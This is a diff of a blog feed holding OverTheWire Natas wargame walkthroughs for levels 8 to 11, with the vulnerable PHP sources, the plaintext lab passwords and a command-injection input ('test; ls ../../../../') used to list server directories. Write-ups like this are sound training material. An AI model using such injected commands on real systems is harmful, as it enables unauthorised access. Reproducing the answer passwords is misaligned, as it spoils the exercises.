+ &lt;span class=&quot;nv&quot;&gt;$tempdata&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;json_decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;xor_encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;base64_decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;data&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])),&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  
+ &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;is_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$tempdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;array_key_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;showpassword&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$tempdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;array_key_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;bgcolor&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$tempdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
+ &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;/^#(?:[a-fd]{6})$/i&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$tempdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;bgcolor&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
+ &lt;span class=&quot;nv&quot;&gt;$mydata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;showpassword&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$tempdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;showpassword&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;  
+ &lt;span class=&quot;nv&quot;&gt;$mydata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;bgcolor&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$tempdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;bgcolor&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;  
+ &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
+ &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
+ &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
+ &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$mydata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
+  
+&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;saveData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
+ &lt;span class=&quot;nb&quot;&gt;setcookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;data&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;base64_encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;xor_encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;json_encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))));&lt;/span&gt;  
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
+  
+&lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;loadData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$defaultdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  
+  
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;array_key_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;bgcolor&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
+ &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;/^#(?:[a-fd]{6})$/i&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;bgcolor&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
+ &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;bgcolor&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;bgcolor&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;  
+ &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
+  
+&lt;span class=&quot;nf&quot;&gt;saveData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  
+  
+  
+  
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;this-line-looks-interesting-to-me-is-the-cookie-the-key-im-going-to-have-to-copy-this-php-and-do-some-tweaks&quot;&gt;This line looks interesting to me. Is the cookie the key? I’m going to have to copy this PHP and do some tweaks..,&lt;/h3&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$tempdata&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;json_decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;xor_encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;base64_decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;data&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])),&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;im-going-to-do-some-stuff-to-be-continued&quot;&gt;I’m going to do some stuff.. To be continued.&lt;/h3&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="OverTheWire" /><category term="Natas" /><summary type="html">Level 11</summary></entry><entry><title type="html">Overthewire Natas Level 9 To 10</title><link href="http://localhost:4000/overthewire/natas/2021/04/11/OverTheWire-Natas-Level-9-to-10.html" rel="alternate" type="text/html" title="Overthewire Natas Level 9 To 10" /><published>2021-04-11T10:40:00+01:00</published><updated>2021-04-11T10:40:00+01:00</updated><id>http://localhost:4000/overthewire/natas/2021/04/11/OverTheWire-Natas-Level-9-to-10</id><content type="html" xml:base="http://localhost:4000/overthewire/natas/2021/04/11/OverTheWire-Natas-Level-9-to-10.html">&lt;h1 id=&quot;level-10&quot;&gt;Level 10&lt;/h1&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Username: natas10
+Password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+URL:      http://natas10.natas.labs.overthewire.org
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;as-normal-lets-look-at-various-sources&quot;&gt;As normal, lets look at various sources&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;i-dont-believe-you-lets-see-what-happens&quot;&gt;I don’t believe you, lets see what happens.&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;okay-fair-in-the-source-code&quot;&gt;Okay, fair. In the source code:&lt;/h3&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?&lt;/span&gt;  
+&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
+  
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;array\_key\_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;needle&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; $\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
+ &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; $\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_REQUEST&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;needle&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;  
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
+  
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
+ &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;preg\_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;/\[;|&amp;amp;\]/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
+ &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Input contains an illegal character!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
+ &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
+ &lt;span class=&quot;nb&quot;&gt;passthru&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;grep -i &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; dictionary.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  
+ &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;so-this-is-definately-something-where-you-traverse-but-cant-use-any-fun-characters-okay-lets-yolo-and-use-a-ls&quot;&gt;So this is definately something where you traverse, but can’t use any fun characters. Okay, lets yolo and use ‘a ls’&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/43.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;that-is-actually-interesting-i-wonder-if-we-look-at-the-same-path-as-the-previous-challenge-and-increment-by-1-and-cat-the-file&quot;&gt;That is actually interesting. I wonder if we look at the same path as the previous challenge (and increment by 1) and cat the file..&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/44.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;nope-lets-try-a-few-more-what-could-hurt&quot;&gt;Nope. Lets try a few more, what could hurt?&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/45.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;nope&quot;&gt;Nope&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/46.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;what-why-did-that-work&quot;&gt;What? Why did that work?&lt;/h3&gt;
+
+&lt;h3 id=&quot;this-is-why&quot;&gt;This is why:&lt;/h3&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;       &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--ignore-case&lt;/span&gt;
+              Ignore  &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt;  distinctions,  so that characters that differ
+              only &lt;span class=&quot;k&quot;&gt;in case&lt;/span&gt; match each other.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;so-the-grep-command--i-will-look-for-any-ignoring-case-in-the-password-the-password-doesnt-contain-an-a-or-a-b-but-it-does-contain-a-c-thats-weird&quot;&gt;So the grep command -i will look for any (ignoring case) in the password. The password doesn’t contain an A… or a B… But it does contain a C. That’s weird.&lt;/h3&gt;
+
+&lt;p&gt;VICTORY.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="OverTheWire" /><category term="Natas" /><summary type="html">Level 10</summary></entry><entry><title type="html">Overthewire Natas Level 8 To 9</title><link href="http://localhost:4000/overthewire/natas/2021/04/11/OverTheWire-Natas-Level-8-to-9.html" rel="alternate" type="text/html" title="Overthewire Natas Level 8 To 9" /><published>2021-04-11T10:30:00+01:00</published><updated>2021-04-11T10:30:00+01:00</updated><id>http://localhost:4000/overthewire/natas/2021/04/11/OverTheWire-Natas-Level-8-to-9</id><content type="html" xml:base="http://localhost:4000/overthewire/natas/2021/04/11/OverTheWire-Natas-Level-8-to-9.html">&lt;h1 id=&quot;level-9&quot;&gt;Level 9&lt;/h1&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Username: natas9
+Password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+URL:      http://natas9.natas.labs.overthewire.org
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;as-normal-lets-look-at-various-sources&quot;&gt;As normal, lets look at various sources&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/32.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/assets/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;hmm-it-greps-i-wonder-if-we-can-escape-that-lets-do-some-stuff-we-learnt-in-rabit-with-traversal-again&quot;&gt;Hmm, it greps. I wonder if we can escape that.. Let’s do some stuff we learnt in Rabit with traversal again.&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;well-that-worked-lets-go-deeper&quot;&gt;Well that worked, lets go deeper.&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; ../../../../ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;mkay-lets-go-deeepperrr-etc&quot;&gt;Mkay, lets go deeepperrr etc&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/36.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/assets/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;whats-in-there&quot;&gt;What’s in there?&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/38.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/assets/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;lets-look-in-there&quot;&gt;Lets look in there.&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;VICTORY.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="OverTheWire" /><category term="Natas" /><summary type="html">Level 9</summary></entry><entry><title type="html">Overthewire Natas Level 7 To 8</title><link href="http://localhost:4000/overthewire/natas/2021/04/11/OverTheWire-Natas-Level-7-to-8.html" rel="alternate" type="text/html" title="Overthewire Natas Level 7 To 8" /><published>2021-04-11T10:20:00+01:00</published><updated>2021-04-11T10:20:00+01:00</updated><id>http://localhost:4000/overthewire/natas/2021/04/11/OverTheWire-Natas-Level-7-to-8</id><content type="html" xml:base="http://localhost:4000/overthewire/natas/2021/04/11/OverTheWire-Natas-Level-7-to-8.html">&lt;h1 id=&quot;level-8&quot;&gt;Level 8&lt;/h1&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Username: natas8
+Password: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
 URL:      http://natas0.natas.labs.overthewire.org
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;h2 id=&quot;first-step-look-at-the-source&quot;&gt;First step, look at the source&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;mmmmkay-so-i-need-to&quot;&gt;Mmmmkay. So I need to:&lt;/h2&gt;
+&lt;ol&gt;
+  &lt;li&gt;Install WAMP&lt;/li&gt;
+  &lt;li&gt;base64_decode.&lt;/li&gt;
+  &lt;li&gt;strrev&lt;/li&gt;
+  &lt;li&gt;hex2bin&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;heres-the-script&quot;&gt;Here’s the script&lt;/h3&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$encodedSecret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;3d3d516343746d4d6d6c315669563362&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decodeSecret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$secret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
+ &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;base64\_decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;strrev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex2bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$secret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)));&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;decodeSecret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$encodedSecret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
